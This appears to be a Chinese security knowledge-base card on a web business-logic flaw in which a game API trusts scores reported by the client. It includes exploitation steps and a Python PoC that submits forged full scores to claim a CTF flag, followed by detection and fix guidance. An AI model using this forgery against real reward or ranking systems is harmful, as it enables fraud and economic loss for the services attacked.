---
id: web-generic-client-side-score-trust
title: 游戏/积分接口信任客户端上报分数：直接调用接口伪造满分领取奖励
type: scenario
domain: web
path: web/generic
technique: client-side-score-trust
aliases:
- 客户端分数可信
- 游戏分数篡改
- update_score 任意分数
- 前端分数校验绕过
- 业务逻辑校验缺失
tags:
- web
- business-logic
- client-side-trust
- score
- api
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:47:37+08:00'
  notes: 已对照原文前端 JS 与 exp 核对：接口 ffffflllllaaaaaagggggg.php 的 register/update_score/get_flag，参数 session_id/score/clicks/difficulty/final_score，先提交 999999 再提交 1000000 后 get_flag 取得奖励，与原文 exp 一致；卡片已注明原文未说明两步是否为接口限制。原文未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

当游戏分数的累加与校验只在前端完成，后端仅接收 `update_score`/`get_flag` 上报的 `score`、`clicks`、`final_score` 而不校验其来源时，攻击者可直接注册会话并调用接口提交满分，绕过正常游戏过程领取奖励或 flag。

## 原理

- 前端 JavaScript 维护 `score`、`clicks` 等变量，点击目标时在浏览器内累加，再通过 `update_score` 上报；`getFlag()` 把 `final_score` 与 `session_id` 发给后端换取 flag。
- 后端把上报值当作可信状态：既没有按点击事件/时间窗口校验分数增长速率，也没有由服务端保存权威分数，`final_score` 只做阈值比较。
- 因此攻击者不需要运行游戏或修改内存，直接用 HTTP 客户端注册会话、提交任意分数，再调用领奖接口即可；分数是否通过前端计算与后端判定无关。
- 本例的利用先提交略低于阈值的分数、再提交阈值分数，说明后端校验的是“本次上报值”而不是“分数从哪来”，分步提交即可满足；原文未说明该两步是否为接口限制。
- 之所以成立：信任边界画错——客户端上报的数据被当成服务端事实，缺少事件级校验与服务端权威状态。

## 触发条件

- 存在注册/会话创建接口，且会话 ID 由客户端生成或可预测；
- 分数上报接口（如 `update_score`）接受客户端提交的 `score`/`clicks` 并直接落库或作为领奖依据；
- 领奖接口（如 `get_flag`）只比较客户端提交的 `final_score` 与阈值；
- 后端没有对游戏事件、时间、点击次数做服务端复核。

## 利用步骤

1. 阅读前端 JS，定位分数变量、上报接口与领奖接口的参数名（`session_id`、`score`、`clicks`、`final_score`）。
2. 调用注册接口创建会话。
3. 调用 `update_score`，可按文章做法先提交接近阈值的分数、再提交达到阈值的分数，观察接口是否接受。
4. 调用 `get_flag`，把 `final_score` 设为阈值（如 1000000），获取响应中的 flag/奖励。
5. 若接口校验 `clicks` 与 `score` 的比例或难度，按前端逻辑同步伪造这些字段。

## PoC

```python
import requests, time

url = "http://target/"
sid = "session_" + str(int(time.time()))

s = requests.Session()
s.post(url + "ffffflllllaaaaaagggggg.php?action=register", data={"session_id": sid})
s.post(url + "ffffflllllaaaaaagggggg.php?action=update_score",
       data={"session_id": sid, "score": 999999, "clicks": 999999, "difficulty": "easy"})
s.post(url + "ffffflllllaaaaaagggggg.php?action=update_score",
       data={"session_id": sid, "score": 1000000, "clicks": 1000000, "difficulty": "easy"})
r = s.post(url + "ffffflllllaaaaaagggggg.php?action=get_flag",
           data={"session_id": sid, "final_score": 1000000})
print(r.text)
```

## 变体与关联

- 变体：排行榜、签到、优惠券、成就系统等任何“客户端计算、服务端只接收结果”的积分场景；也可篡改 `clicks`、`difficulty`、时间戳等伴随字段。
- 与会话相关的变体：`session_id` 由客户端生成时可枚举/伪造他人会话，叠加越权。
- 关联：[[web-generic-auth-multi-session-matrix-leakscore]]（越权/会话矩阵检测）；[[web-generic-csv-formula-injection-export-rce]]（另一类业务数据信任问题）。
- 影响边界：本例仅换取 CTF flag；真实业务中可换取实物奖励、优惠券或提升排名，造成经济损失。

## 检测与防御

- 检测：同一会话在极短时间内分数从 0 跳到阈值、`clicks` 与 `score` 不匹配、领奖接口的 `final_score` 与后端记录不一致；注册后立即调用 `update_score`/`get_flag` 的异常时序。
- 修复：服务端保存权威分数，按游戏事件（点击/关卡）逐次校验并限制增长速率；领奖时不信任客户端提交的 `final_score`，以服务端状态为准。
- 缓解：会话 ID 由服务端生成并绑定；对分数变更做签名/风控；监控异常分数曲线与自动化请求特征。
